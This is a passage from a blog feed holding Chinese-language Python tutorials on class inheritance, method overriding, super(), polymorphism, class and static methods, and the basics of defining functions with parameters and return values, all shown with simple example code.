class="headerlink" title="三、单继承和多层继承"></a>三、单继承和多层继承</h2><h3 id="1-单继承"><a href="#1-单继承" class="headerlink" title="1. 单继承"></a>1. 单继承</h3><ul><li>单继承：子类只继承一个父类</li></ul><pre><code class="python"># 定义一个父类， Animalclass Animal(object):    def eat(self):        print(&#39;吃东西&#39;)# 定义一个子类，只有一个父类class Dog(Animal):    pass# 创建一个子类对象dog1 = Dog()dog1.eat()</code></pre><h3 id="2-多层继承"><a href="#2-多层继承" class="headerlink" title="2. 多层继承"></a>2. 多层继承</h3><ul><li>多层继承：继承关系为多层传递，如生活中的<code>爷爷、父亲、儿子</code></li></ul><pre><code class="python"># 定义一个爷爷类， Animalclass Animal(object):    def eat(self):        print(&#39;吃东西&#39;)# 定义一个父亲类class Dog(Animal):    def drink(self):        print(&#39;喝东西&#39;)# 定义一个儿子类class SuperDog(Dog):    pass# 创建对象sd = SuperDog()sd.eat()sd.drink()</code></pre><h2 id="四、重写父类方法"><a href="#四、重写父类方法" class="headerlink" title="四、重写父类方法"></a>四、重写父类方法</h2><h3 id="1-子类重写父类同名方法"><a href="#1-子类重写父类同名方法" class="headerlink" title="1. 子类重写父类同名方法"></a>1. 子类重写父类同名方法</h3><ul><li>父类的方法不能满足子类的需要，可以对父类的方法重写，重写父类方法的目的是为了给他扩展功能</li><li>在子类中定义了一个和父类同名的方法(参数也一样)，即为对父类的方法重写</li><li>子类调用同名方法，默认只会调用子类的</li></ul><p>示例代码：</p><pre><code class="python"># 定义一个父类， Animalclass Animal(object):    # 添加一个type属性    def __init__(self):        print(&#39;Animal类中的__init__&#39;)        self.type = &#39;动物&#39;    # 设计一个方法，打印属性    def print_type(self):        print(&#39;Animal类中的print_type = &#39;, self.type)# 定义一个子类，继承与Animalclass Dog(Animal):    # __init__和父类的同名，重写父类同名方法    def __init__(self):        print(&#39;Dog类中的__init__&#39;)        self.type = &#39;可爱的小狗&#39;    # print_type和父类的同名，重写父类同名方法    def print_type(self):        print(&#39;Dog类中的print_type = &#39;, self.type)# 定义一个子类对象dog1 = Dog()  # 调用子类的__init__dog1.print_type()  # 调用子类的print_type()</code></pre><p>运行结果：</p><pre><code class="python">Dog类中的__init__Dog类中的print_type =  可爱的小狗</code></pre><h3 id="2-子类调用父类同名方法"><a href="#2-子类调用父类同名方法" class="headerlink" title="2. 子类调用父类同名方法"></a>2. 子类调用父类同名方法</h3><ul><li>子类调用父类同名方法：<ol><li><code>父类名.同名方法(self, 形参1, ……)</code></li><li><code>super(子类名, self).同名方法(形参1, ……)</code></li><li><code>super().同名方法(形参1, ……)</code>：是方法 2 的简写，推荐的写法</li></ol></li></ul><p>示例代码：</p><pre><code class="python"># 定义一个父类， Animalclass Animal(object):    # 添加一个type属性    def __init__(self):        print(&#39;Animal类中的__init__&#39;)        self.type = &#39;动物&#39;    # 设计一个方法，打印属性    def print_type(self):        print(&#39;Animal类中的print_type = &#39;, self.type)# 定义一个子类，继承与Animalclass Dog(Animal):    # __init__和父类的同名，重写父类同名方法    def __init__(self):        print(&#39;Dog类中的__init__&#39;)        self.type = &#39;可爱的小狗&#39;    # print_type和父类的同名，重写父类同名方法    def print_type(self):        print(&#39;Dog类中的print_type = &#39;, self.type)        print(&#39;=&#39;*20)        # 调用父类同名函数        # 方法1： 父类名.同名方法(self, 形参1, ……)        Animal.__init__(self)        Animal.print_type(self)        print(&#39;=&#39; * 20)        # 方法2：super(子类名, self).同名方法(形参1, ……)        super(Dog, self).__init__()        super(Dog, self).print_type()        print(&#39;=&#39; * 20)        # 方法3：super().同名方法(形参1, ……) # 是 4.2 方法的简写        # 推荐使用的方法        super().__init__()        super().print_type()# 定义一个子类对象dog1 = Dog()  # 调用子类的__init__dog1.print_type()  # 调用子类的print_type()</code></pre><p>运行结果：</p><pre><code class="python">Dog类中的__init__Dog类中的print_type =  可爱的小狗====================Animal类中的__init__Animal类中的print_type =  动物====================Animal类中的__init__Animal类中的print_type =  动物====================Animal类中的__init__Animal类中的print_type =  动物</code></pre><h2 id="五、多继承"><a href="#五、多继承" class="headerlink" title="五、多继承"></a>五、多继承</h2><h3 id="1-多继承"><a href="#1-多继承" class="headerlink" title="1. 多继承"></a>1. 多继承</h3><ul><li><p>所谓多继承，即子类有多个父类，并且具有它们的特征。</p></li><li><p>多继承的语法格式：</p><pre><code class="python">class 子类名(父类1, 父类2, ……)：    pass</code></pre></li></ul><p>示例代码：</p><pre><code class="python"># 定义2个类，它们没有继承关系，是平级的class SmallDog(object):    def eat(self):        print(&#39;吃小东西&#39;)# 再定义一个类class BigDog(object):    def drink(self):        print(&#39;大口喝水&#39;)# 定义一个子类，多继承于上面2个父类class SuperDog(SmallDog, BigDog):    pass# 定义子类对象，调用方法sd = SuperDog()sd.eat()sd.drink()</code></pre><p>运行结果：</p><pre><code class="python">吃小东西大口喝水</code></pre><h3 id="2-类的继承顺序"><a href="#2-类的继承顺序" class="headerlink" title="2. 类的继承顺序"></a>2. 类的继承顺序</h3><ul><li>查看类的继承顺序：<code>类名.__mro__</code></li></ul><p>示例代码：</p><pre><code class="python"># 定义2个类，它们没有继承关系，是平级的class SmallDog(object):    def eat(self):        print(&#39;吃小东西&#39;)# 再定义一个类class BigDog(object):    def drink(self):        print(&#39;大口喝水&#39;)# 定义一个子类，多继承于上面2个父类class SuperDog(SmallDog, BigDog):    pass# 查看类的继承顺序print(SuperDog.__mro__)</code></pre><p>运行结果：</p><pre><code class="python">(&lt;class &#39;__main__.SuperDog&#39;&gt;, &lt;class &#39;__main__.SmallDog&#39;&gt;, &lt;class &#39;__main__.BigDog&#39;&gt;, &lt;class &#39;object&#39;&gt;)</code></pre><h3 id="3-调用父类同名方法"><a href="#3-调用父类同名方法" class="headerlink" title="3. 调用父类同名方法"></a>3. 调用父类同名方法</h3><h4 id="3-1-默认调用情况"><a href="#3-1-默认调用情况" class="headerlink" title="3.1 默认调用情况"></a>3.1 默认调用情况</h4><ul><li>如果继承过来的2个父类的方法同名，默认调用先继承父类的同名方法</li></ul><pre><code class="python"># 定义2个类，它们没有继承关系，是平级的class SmallDog(object):    def eat(self):        print(&#39;吃小东西&#39;)# 再定义一个类class BigDog(object):    def eat(self):        print(&#39;啃大骨头&#39;)# 定义一个子类，多继承于上面2个父类class SuperDog(SmallDog, BigDog):    pass# 定义子类对象，调用方法sd = SuperDog()sd.eat()  # 默认先调用先继承的父类，即 SmallDog</code></pre><p>运行结果：</p><pre><code class="python">吃小东西</code></pre><h4 id="3-2-子类调用父类同名方法"><a href="#3-2-子类调用父类同名方法" class="headerlink" title="3.2 子类调用父类同名方法"></a>3.2 子类调用父类同名方法</h4><ul><li>子类调用父类同名方法：<ol><li><code>父类名.同名方法(self, 形参1, ……)</code>：调用指定的父类</li><li><code>super(类名, self).同名方法(形参1, ……)</code>：调用继承顺序中类名的下一个类的同名方法</li><li><code>super().同名方法(形参1, ……)</code>：调用先继承父类的同名方法</li></ol></li></ul><p>示例代码：</p><pre><code class="python"># 定义2个类，它们没有继承关系，是平级的class SmallDog(object):    def eat(self):        print(&#39;吃小东西&#39;)# 再定义一个类class BigDog(object):    def eat(self):        print(&#39;啃大骨头&#39;)# 定义一个子类，多继承于上面2个父类class SuperDog(SmallDog, BigDog):    def eat(self):        print(&#39;吃蟠桃&#39;)        print(&#39;=&#39;*20)        # 子类调用父类同名方法：        # 1. 父类名.同名方法(self, 形参1, ……)        SmallDog.eat(self)  # 调用SmallDog的eat()        print(&#39;=&#39; * 20)        # 2. super(类名, self).同名方法(形参1, ……)：调用继承顺序中类名的下一个类的同名方法        # 继承顺序中，SmallDog的下一个类是BigDog,所以，调用BigDog的eat()        super(SmallDog, self).eat()        print(&#39;=&#39; * 20)        # 3. super().同名方法(形参1, ……) ：调用先继承父类的同名方法        super().eat()# 定义子类对象，调用方法sd = SuperDog()sd.eat()</code></pre><p>运行结果：</p><pre><code class="python">吃蟠桃====================吃小东西====================啃大骨头====================吃小东西</code></pre><h2 id="六、私有和继承"><a href="#六、私有和继承" class="headerlink" title="六、私有和继承"></a>六、私有和继承</h2><h3 id="1-私有和继承"><a href="#1-私有和继承" class="headerlink" title="1. 私有和继承"></a>1. 私有和继承</h3><ul><li>父类中的私有方法、属性不能直接继承使用</li><li>可以通过调用继承的父类的共有方法，间接的访问父类的私有方法、属性</li></ul><pre><code class="python"># 定义一个父类， Animalclass Animal(object):    # 添加一个type属性    def __init__(self):        self.__type = &#39;动物&#39;  # 私有    def __leave(self):  # 私有        print(&#39;休产假3个月&#39;)    # 通过公有方法，间接访问私有元素    def use_private(self):        print(self.__type)        self.__leave()# 定义一个子类class Dog(Animal):    def test(self):        # print(self.__type) # err，私有不能直接继承使用        # self.__leave() # err，私有不能直接继承使用        pass# 创建子类对象dog1 = Dog()dog1.use_private()</code></pre><h2 id="七、多态"><a href="#七、多态" class="headerlink" title="七、多态"></a>七、多态</h2><h3 id="1-多态"><a href="#1-多态" class="headerlink" title="1. 多态"></a>1. 多态</h3><ul><li>多态：多种形态，调用同一个函数，不同表现</li><li>因为Python是动态语言，站在用户的角度，本身就是多态，不存在非多态的情况</li><li>实现多态的步骤:<ol><li>实现继承关系</li><li>子类重写父类方法</li><li>通过对象调用该方法</li></ol></li></ul><p>示例代码：</p><pre><code class="python">&quot;&quot;&quot;1. 多态：多种形态，调用同一个函数，不同表现2. 实现多态的步骤:  1. 实现继承关系  2. 子类重写父类方法  3. 通过对象调用该方法&quot;&quot;&quot;# 定义一个父类， Animalclass Animal(object):    def eat(self):        print(&#39;吃东西&#39;)# 定义一个子类Dog，继承于Animalclass Dog(Animal):    def eat(self):        &quot;&quot;&quot;重写父类方法&quot;&quot;&quot;        print(&#39;啃骨头&#39;)# 定义一个子类Cat，继承于Animalclass Cat(Animal):    def eat(self):        &quot;&quot;&quot;重写父类方法&quot;&quot;&quot;        print(&#39;吃小鱼&#39;)# 定义一个函数，用于测试多态def func(temp):    temp.eat()# 创建子类对象d = Dog()c = Cat()# 调用同一个函数，不同表现# 传递d参数，调用Dog的eat()# 传递c参数，调用Cat的eat()func(d)  # 啃骨头func(c)  # 吃小鱼</code></pre><h2 id="八、实例属性、类属性"><a href="#八、实例属性、类属性" class="headerlink" title="八、实例属性、类属性"></a>八、实例属性、类属性</h2><h3 id="1-实例属性和类属性"><a href="#1-实例属性和类属性" class="headerlink" title="1. 实例属性和类属性"></a>1. 实例属性和类属性</h3><h4 id="1-1-专业名词说明"><a href="#1-1-专业名词说明" class="headerlink" title="1.1 专业名词说明"></a>1.1 专业名词说明</h4><ul><li>在Python中 “万物皆对象”</li><li>通过类创建的对象 又称为 <strong>实例对象</strong>，<strong>对象属性 又称为 实例属性</strong></li><li>类本身也是一个对象，执行class语句时会被创建，称为 <strong>类对象</strong>，为了和实例对象区分开来，我们习惯叫类</li></ul><h4 id="1-2-实例属性"><a href="#1-2-实例属性" class="headerlink" title="1.2 实例属性"></a>1.2 实例属性</h4><ul><li><p>通过在<code>__init__</code>方法里面给实例对象添加的属性</p></li><li><p>在类的外面，直接通过实例对象添加的属性</p></li><li><p><strong>实例属性</strong>必须通过<strong>实例对象</strong>才能访问</p><pre><code class="python"># 定义类class 类名(object):    def __init__(self):        self.实例属性变量1 = 数值1        self.实例属性变量2 = 数值3# 创建实例对象实例对象名 = 类名()# 添加属性实例对象名.实例属性变量3 = 数值3</code></pre></li></ul><h4 id="1-3-类属性"><a href="#1-3-类属性" class="headerlink" title="1.3 类属性"></a>1.3 类属性</h4><ul><li><p>类属性就是 <strong>类对象</strong> 所拥有的属性，它被 <strong>该类的所有实例对象 所共有</strong>。</p></li><li><p>定义在<strong>类里面，类方法外面</strong>的变量就是<strong>类属性</strong></p></li><li><p>类属性可以使用 <strong>类名</strong> 或 <strong>实例对象</strong> 访问，<strong>推荐使用类名访问</strong></p><pre><code class="python"># 定义类class 类名(object):    类属性变量 = 数值1    def __init__(self):        pass</code></pre></li></ul><h4 id="1-4-示例代码"><a href="#1-4-示例代码" class="headerlink" title="1.4 示例代码"></a>1.4 示例代码</h4><pre><code class="python">class Dog(object):    # 类属性    count = 0    def __init__(self):        # 实例属性        self.name = &#39;大黄狗&#39;# 类属性同构类名访问，格式：类名.类属性名字print(Dog.count)# 创建实例对象dog1 = Dog()print(dog1.count)  # 实例对象访问类属性print(dog1.name)  # 实例属性</code></pre><p>运行结果：</p><pre><code class="python">00大黄狗</code></pre><h3 id="2-类属性和实例属性的区别"><a href="#2-类属性和实例属性的区别" class="headerlink" title="2. 类属性和实例属性的区别"></a>2. 类属性和实例属性的区别</h3><ul><li>类属性就是 <strong>类对象</strong> 所拥有的属性，它被 <strong>该类的所有实例对象 所共有</strong>。</li><li><strong>实例属性</strong> 要求 <strong>每个对象</strong> 为其 <strong>单独开辟一份内存空间</strong> ，只属于某个实例对象的</li></ul><p>示例代码：</p><pre><code class="python">&quot;&quot;&quot;1. 定义一个类属性count，用于记录实例对象初始化的次数2. __init__添加实例属性name，每初始化1次，类属性count加1&quot;&quot;&quot;class Dog(object):    # 类属性    count = 0    def __init__(self, _name):        # 实例属性        self.name = _name        # 每初始化一次，类属性数量加1        Dog.count += 1# 打印类属性的值print(Dog.count)# 创建1个对象d1 = Dog(&#39;旺财&#39;)# 打印：实例属性，类属性print(d1.name, Dog.count)d2 = Dog(&#39;旺钱&#39;)print(d2.name, Dog.count)d3 = Dog(&#39;旺仔&#39;)print(d3.name, Dog.count)# 通过实例对象，访问类属性print(d1.count, d2.count, d3.count)</code></pre><p>运行结果：</p><pre><code>0旺财 1旺钱 2旺仔 33 3 3</code></pre><h3 id="3-注意点"><a href="#3-注意点" class="headerlink" title="3. 注意点"></a>3. 注意点</h3><h4 id="3-1-修改类属性"><a href="#3-1-修改类属性" class="headerlink" title="3.1 修改类属性"></a>3.1 修改类属性</h4><ul><li><strong>类属性只能通过类对象修改，不能通过实例对象修改</strong></li></ul><pre><code class="python"># 类属性修改，只能通过类名修改，不能通过对象名修改class Dog(object):    # 类属性    count = 0# 通过类名修改Dog.count = 1print(Dog.count)print(&#39;=&#39;*30)# 对象名.变量 = 数据 默认操作给实例对象添加实例属性，已经不能操作类属性# 如果类属性名字和实例属性名字相同，实例对象名只能操作实例属性d1 = Dog()d1.count = 250print(Dog.count, d1.count)</code></pre><p>运行结果：</p><pre><code class="python">1==============================1 250</code></pre><h4 id="3-2-类属性和实例属性同名"><a href="#3-2-类属性和实例属性同名" class="headerlink" title="3.2 类属性和实例属性同名"></a>3.2 类属性和实例属性同名</h4><ul><li>如果类属性和实例属性同名，实例对象名只能操作实例属性</li><li>结论：<strong>操作类属性建议使用类名</strong>，避免不必要的麻烦</li></ul><pre><code class="python">class Dog(object):    # 类属性    count = 666    def __init__(self):        self.count = 250  # 实例属性# 创建对象# 如果类属性和实例属性同名，实例对象名只能操作实例属性d1 = Dog()print(Dog.count, d1.count)</code></pre><p>运行结果：</p><pre><code class="python">666 250</code></pre><h4 id="3-3-私有类属性"><a href="#3-3-私有类属性" class="headerlink" title="3.3 私有类属性"></a>3.3 私有类属性</h4><ul><li><p>类属性也可以设置为 <strong>私有</strong>，前边添加两个下划线<code>__</code></p><pre><code class="python">class Dog(object):    # 类属性    __count = 0print(Dog.__count)  # 类的外面，不能直接访问私有类属性，err</code></pre></li></ul><h2 id="九、类方法、静态方法"><a href="#九、类方法、静态方法" class="headerlink" title="九、类方法、静态方法"></a>九、类方法、静态方法</h2><h3 id="1-类方法"><a href="#1-类方法" class="headerlink" title="1. 类方法"></a>1. 类方法</h3><ul><li><strong>类对象所拥有的方法</strong>，主要为了在没有创建实例对象前提下，处理类属性</li><li>需要用装饰器<code>@classmethod</code>来标识其为类方法</li><li>对于类方法，<strong>第一个参数必须是类对象(代表类)</strong>，一般以<code>cls</code>作为第一个参数，这个参数不用人为传参，解释器会自动处理</li></ul><pre><code class="python">&quot;&quot;&quot;类方法：为了方便处理类属性    1. 用装饰器 @classmethod 来标识其为类方法    2. 一般以 cls 作为第一个参数，代表当前这个类，这个参数不用人为传参，解释器会自动处理    3. 类方法调用：        3.1 类名.类方法()    推荐用法        3.2 实例对象名.类方法()&quot;&quot;&quot;class Dog(object):    # 类属性    count = 0    # 定义类方法    @classmethod    def print_num(cls):  # 参数cls代表当前的类        # print(&#39;count = &#39;, Dog.count)        print(&#39;count = &#39;, cls.count)# 调用类方法Dog.print_num()</code></pre><h3 id="2-静态方法"><a href="#2-静态方法" class="headerlink" title="2. 静态方法"></a>2. 静态方法</h3><ul><li>需要通过装饰器<code>@staticmethod</code>来进行修饰，<strong>静态方法默认情况下, 既不传递类对象也不传递实例对象（形参没有self/cls）</strong>。</li><li>当方法中 <strong>既不需要使用实例对象</strong>，<strong>也不需要使用类对象</strong>时，定义静态方法</li><li><strong>取消不需要的参数传递</strong>，有利于 <strong>减少不必要的内存占用和性能消耗</strong></li><li>静态方法 也能够通过 <strong>实例对象</strong> 和 <strong>类对象(类名)</strong> 去访问。</li></ul><pre><code class="python">&quot;&quot;&quot;静态方法：    1. 需要通过装饰器@staticmethod来进行修饰默认情况下    2. 既不传递类对象也不传递实例对象（形参没有self/cls）    3. 静态方法调用：        3.1 类名.静态方法()    推荐用法        3.2 实例对象名.静态方法()&quot;&quot;&quot;class Dog(object):    # 定义静态方法    @staticmethod    def normal_func():        print(&#39;一个和实例属性、类属性没有关系的普通方法&#39;)# 调用静态方法Dog.normal_func()</code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python基础04-函数</title>
      <link href="/2020/07/26/2020-07-27-python%E5%9F%BA%E7%A1%8004-%E5%87%BD%E6%95%B0/"/>
      <url>/2020/07/26/2020-07-27-python%E5%9F%BA%E7%A1%8004-%E5%87%BD%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><h2 id="一、函数的基本使用"><a href="#一、函数的基本使用" class="headerlink" title="一、函数的基本使用"></a>一、函数的基本使用</h2><h3 id="1-基本概念"><a href="#1-基本概念" class="headerlink" title="1. 基本概念"></a>1. 基本概念</h3><a id="more"></a><ul><li><p>所谓<strong>函数</strong>，就是把 <strong>具有独立功能的代码块</strong> 组织为一个整体，在需要的时候 <strong>调用</strong></p></li><li><p>函数的使用包含两个步骤：</p><ol><li>定义函数 —— 在函数中编写代码，实现功能</li><li>调用函数 —— 执行编写的代码</li></ol></li><li><p>函数的作用：</p><ul><li>提高代码编写效率, 代码<strong>重用</strong></li><li>写一次函数代码块，后面使用的时候，只需要调用函数即可，无需重新编写函数代码块</li></ul></li><li><h3 id="2-函数的定义和调用"><a href="#2-函数的定义和调用" class="headerlink" title="2. 函数的定义和调用"></a>2. 函数的定义和调用</h3><h4 id="2-1-函数的定义"><a href="#2-1-函数的定义" class="headerlink" title="2.1 函数的定义"></a>2.1 函数的定义</h4><p>定义函数的格式如下：</p><pre><code class="python">def 函数名():    函数内部的代码块    ……</code></pre><ol><li><code>def</code> 是英文 <code>define</code> 的缩写</li><li>函数名称的命名应该符合标识符的命名规则<ul><li>可以由 <strong>字母</strong>、<strong>下划线</strong> 和 <strong>数字</strong> 组成</li><li><strong>不能以数字开头</strong></li><li><strong>不能与关键字重名</strong></li><li>建议不要和类型同名</li></ul></li></ol><h4 id="2-2-函数的调用"><a href="#2-2-函数的调用" class="headerlink" title="2.2 函数的调用"></a>2.2 函数的调用</h4><ul><li><p>函数只是定义，不调用不会自动执行，用户看不到没有效果</p></li><li><p>函数调用的格式：</p><pre><code>函数名字()</code></pre></li></ul><h4 id="2-3-第一个函数演练"><a href="#2-3-第一个函数演练" class="headerlink" title="2.3 第一个函数演练"></a>2.3 第一个函数演练</h4><p><strong>需求</strong></p><ol><li>编写一个打招呼 <code>say_hello</code> 的函数，封装三行打招呼的代码</li><li>在函数下方调用打招呼的代码</li></ol><p>示例代码：</p><pre><code class="python">&quot;&quot;&quot;步骤流程：函数定义：1. def 函数名字():    2. 函数体，打印信息函数调用：函数名字()&quot;&quot;&quot;</code></pre></li></ul><h1 id="函数定义"><a href="#函数定义" class="headerlink" title="函数定义"></a>函数定义</h1><p>  def say_hello():<br>      print(“hello 1”)<br>      print(“hello 2”)<br>      print(“hello 3”)</p><p>  print(‘函数调用前’)</p><p>  say_hello()  # 函数调用</p><p>  print(‘函数调用后’)</p><pre><code>  运行结果：  ```shell  函数调用前  hello 1  hello 2  hello 3  函数调用后</code></pre><h2 id="二-函数执行过程、文档注释"><a href="#二-函数执行过程、文档注释" class="headerlink" title="二.函数执行过程、文档注释"></a>二.函数执行过程、文档注释</h2><h3 id="1-函数执行流程"><a href="#1-函数执行流程" class="headerlink" title="1. 函数执行流程"></a>1. 函数执行流程</h3><h4 id="1-1-函数执行流程"><a href="#1-1-函数执行流程" class="headerlink" title="1.1 函数执行流程"></a>1.1 函数执行流程</h4><ul><li>如果不主动调用函数，函数是不会主动执行的</li><li>函数调用时，默认往前面找函数的定义，如果没有找到函数定义，则报错：<ul><li><code>NameError: name &#39;say_hello&#39; is not defined</code> (<strong>名称错误：say_hello 这个名字没有被定义</strong>)</li></ul></li></ul><h4 id="1-2-Debug-的单步调试"><a href="#1-2-Debug-的单步调试" class="headerlink" title="1.2 Debug 的单步调试"></a>1.2 Debug 的单步调试</h4><ul><li><p><strong>F7 Step Into</strong> 可以单步执行代码，如果是函数，会进入函数内部</p></li><li><p><strong>F8 Step Over</strong> 可以单步执行代码，如果函数，直接执行函数，不会进入函数内部</p></li></ul><h3 id="2-函数的文档注释"><a href="#2-函数的文档注释" class="headerlink" title="2. 函数的文档注释"></a>2. 函数的文档注释</h3><ul><li><p>在开发中，如果希望给函数添加文档注释，应该在 <strong>定义函数</strong> 的下方，使用 <strong>连续的一对三引号</strong></p></li><li><p>在 <strong>连续的一对三引号</strong> 之间编写对函数的说明文字</p><pre><code class="python">def func_sum():    &quot;&quot;&quot;求和 1+2&quot;&quot;&quot;    add_result = 1 + 2    print(add_result)func_sum()</code></pre></li><li><p>在 <strong>函数调用</strong> 位置，使用快捷键 <code>Ctrl + Q</code> 可以查看函数的说明信息</p></li></ul><h2 id="三、函数的参数1：普通参数"><a href="#三、函数的参数1：普通参数" class="headerlink" title="三、函数的参数1：普通参数"></a>三、函数的参数1：普通参数</h2><h3 id="1-函数参数的作用"><a href="#1-函数参数的作用" class="headerlink" title="1. 函数参数的作用"></a>1. 函数参数的作用</h3><p>假如开发一个 <code>func_sum</code> 的函数，函数能够实现 <strong>两个数字的求和</strong> 功能：</p><pre><code class="python"># 函数定义def func_sum():    &quot;&quot;&quot;两个数字的求和&quot;&quot;&quot;    num1 = 10    num2 = 20    result = num1 + num2    print(&quot;%d + %d = %d&quot; % (num1, num2, result))# 函数调用func_sum()</code></pre><ul><li>以上函数只能处理 <strong>固定数值</strong> 的相加</li><li>函数参数，可以解决上面的问题，<strong>可以传递数据给函数内部</strong>，增加函数的 <strong>通用性</strong></li></ul><h3 id="2-带参数函数的使用"><a href="#2-带参数函数的使用" class="headerlink" title="2. 带参数函数的使用"></a>2. 带参数函数的使用</h3><h4 id="2-1-带参数函数的定义和调用"><a href="#2-1-带参数函数的定义和调用" class="headerlink" title="2.1 带参数函数的定义和调用"></a>2.1 带参数函数的定义和调用</h4><ul><li><p>函数定义时的参数叫 <strong>形参</strong>，函数调用时的参数叫 <strong>实参</strong></p></li><li><p>带参数函数的定义格式：</p><pre><code class="python">def 函数名字(形参1，形参2，……):    函数体代码块</code></pre></li><li><p>带参数函数的调用格式：</p><pre><code class="python">函数名字(实参1，实参2，……)</code></pre></li></ul><p>示例代码：</p><pre><code class="python"># 带参数函数的函数定义def func_sum(num1, num2):    &quot;&quot;&quot;两个数字的求和&quot;&quot;&quot;    result = num1 + num2    print(&quot;%d + %d = %d&quot; % (num1, num2, result))# 带参数函数的调用func_sum(20, 30)</code></pre><h4 id="2-2-函数执行流程"><a href="#2-2-函数执行流程" class="headerlink" title="2.2 函数执行流程"></a>2.2 函数执行流程</h4><ul><li>函数调用时，按照函数定义的<strong>形参顺序</strong>，实参 <strong>一一对应</strong> 传递给形参</li></ul><h3 id="2-3-形参的作用域"><a href="#2-3-形参的作用域" class="headerlink" title="2.3 形参的作用域"></a>2.3 形参的作用域</h3><ul><li>作用域：变量起作用的范围</li><li>形参的作用域：<strong>只在定义函数的代码块</strong> 中</li></ul><pre><code class="python"># 形参作用域仅在函数内部, 所以不同函数的同名参数，互不影响def func_sum(num1, num2):    result = num1 + num2    print(result)def func_sub(num1, num2):    result = num1 - num2    print(result)func_sum(1, 3)func_sub(4, 4)</code></pre><h2 id="四、函数的返回值"><a href="#四、函数的返回值" class="headerlink" title="四、函数的返回值"></a>四、函数的返回值</h2><h3 id="1-函数返回值的作用"><a href="#1-函数返回值的作用" class="headerlink" title="1. 函数返回值的作用"></a>1. 函数返回值的作用</h3><ul><li>开发中，有时会希望 <strong>一个函数执行结束后，告诉调用者一个结果</strong>，以便调用者针对具体的结果做后续的处理</li><li><strong>返回值</strong> 是 <strong>函数给调用方提供的结果</strong></li></ul><p>前面接触到返回值的例子：</p><pre><code class="python">&quot;&quot;&quot;返回值变量 = input()返回值变量 = len(容器变量)&quot;&quot;&quot;# 从键盘输入一个内容，内容返回给name赋值name = input(&#39;请输入你的名字：&#39;)print(name)my_str = &#39;hello&#39;# 获取my_str内容的元素个数，返回给n赋值n = len(my_str)print(n)</code></pre><h3 id="2-return关键字的使用"><a href="#2-return关键字的使用" class="headerlink" title="2. return关键字的使用"></a>2. return关键字的使用</h3><h4 id="2-1-通过return给函数设置返回值"><a href="#2-1-通过return给函数设置返回值" class="headerlink" title="2.1 通过return给函数设置返回值"></a>2.1 通过return给函数设置返回值</h4><ul><li><code>return</code> 关键字只能使用在函数中</li><li>在函数中使用 <code>return</code> 关键字可以中断函数，同时也返回一个结果</li><li>调用函数一方，可以 <strong>使用变量</strong> 来 <strong>接收</strong> 函数的返回结果</li></ul><pre><code class="python">&quot;&quot;&quot;函数定义格式：def 函数名():    return 结果函数调用格式：返回值变量 = 函数名()&quot;&quot;&quot;def func_sum(num1, num2):    &quot;&quot;&quot;两个数字的求和&quot;&quot;&quot;    result = num1 + num2    return result  # 中断函数，同时也返回一个结果# 函数调用：返回值变量 = 函数名()ret = func_sum(20, 30)print(ret)</code></pre><h4 id="2-2-函数默认返回值"><a href="#2-2-函数默认返回值" class="headerlink" title="2.2 函数默认返回值"></a>2.2 函数默认返回值</h4><ul><li>函数内部没有任何return语句，默认返回None，表示没有任何数据</li><li>return不设置返回值，默认也返回None</li></ul><pre><code class="python"># 函数定义，函数内部没有任何return语句def normal_func():    print(&#39;^_^&#39;)# 函数定义，return不设置返回值def return_test():    return# 函数调用ret1 = normal_func()print(ret1)  # Noneret2 = return_test()print(ret2)  # None</code></pre><h4 id="2-3-return中断函数"><a href="#2-3-return中断函数" class="headerlink" title="2.3 return中断函数"></a>2.3 return中断函数</h4><ul><li>函数一旦执行return，函数内return下一句往后的代码不会执行</li></ul><pre><code class="python"># 函数定义def func():    print(&#39;不努力，你来深圳干嘛？&#39;)    return    print(&#39;我想玩游戏&#39;)# 函数调用func()</code></pre><p>运行结果：</p><pre><code class="shell">不努力，你来深圳干嘛？</code></pre><h2 id="五、4种函数的类型"><a href="#五、4种函数的类型" class="headerlink" title="五、4种函数的类型"></a>五、4种函数的类型</h2><h3 id="1-4-种函数类型的分类"><a href="#1-4-种函数类型的分类" class="headerlink" title="1. 4 种函数类型的分类"></a>1. 4 种函数类型的分类</h3><ul><li><p>函数根据有没有参数，有没有返回值，可以相互组合，一共有4种</p><ul><li>无参数，无返回值</li><li>无参数，有返回值</li><li>有参数，无返回值</li><li>有参数，有返回值</li></ul></li><li><p>定义函数时，是 <strong>根据实际的功能需求来设计</strong> 的，所以不同开发人员编写的函数类型各不相同</p></li></ul><h3 id="2-无参数，无返回值的函数"><a href="#2-无参数，无返回值的函数" class="headerlink" title="2. 无参数，无返回值的函数"></a>2. 无参数，无返回值的函数</h3><pre><code class="python">&quot;&quot;&quot;无参数，无返回值的格式函数定义：def 函数名():    函数体函数调用：函数名()&quot;&quot;&quot;# 函数定义def menu():    &quot;&quot;&quot;功能菜单&quot;&quot;&quot;    print(&#39;=&#39;*20)    print(&#39;= 1. 添加学生&#39;)    print(&#39;= 2. 删除学生&#39;)    print(&#39;= 3. 查询学生&#39;)    print(&#39;=&#39; * 20)# 函数调用menu()</code></pre><h3 id="3-无参数，有返回值的函数"><a href="#3-无参数，有返回值的函数" class="headerlink" title="3. 无参数，有返回值的函数"></a>3. 无参数，有返回值的函数</h3><pre><code class="python">&quot;&quot;&quot;无参数，有返回值的函数函数定义：def 函数名字():    return 返回结果函数调用：返回值变量 = 函数名字()&quot;&quot;&quot;# 函数定义def get_pi():    &quot;&quot;&quot;    获取圆周率    :return:　返回圆周率    &quot;&quot;&quot;    return 3.14# 函数调用pi = get_pi()print(&#39;圆周率为:%f&#39; % pi)</code></pre><h3 id="4-有参数，无返回值的函数"><a href="#4-有参数，无返回值的函数" class="headerlink" title="4. 有参数，无返回值的函数"></a>4. 有参数，无返回值的函数</h3><pre><code class="python">&quot;&quot;&quot;有参数，无返回值的函数函数定义：def 函数名字(形参1，形参2，……)：    函数体函数调用：函数名(实参1，实参2，……)&quot;&quot;&quot;# 函数定义def print_char(num, char):    &quot;&quot;&quot;    功能：打印指定数量的字符    :param num: 打印字符的个数，整型    :param char: 打印的字符，字符串格式    :return: None    &quot;&quot;&quot;    print(num * char)# 函数调用print_char(5, &#39;^_^ &#39;)</code></pre><h3 id="5-有参数，有返回值的函数"><a href="#5-有参数，有返回值的函数" class="headerlink" title="5. 有参数，有返回值的函数"></a>5. 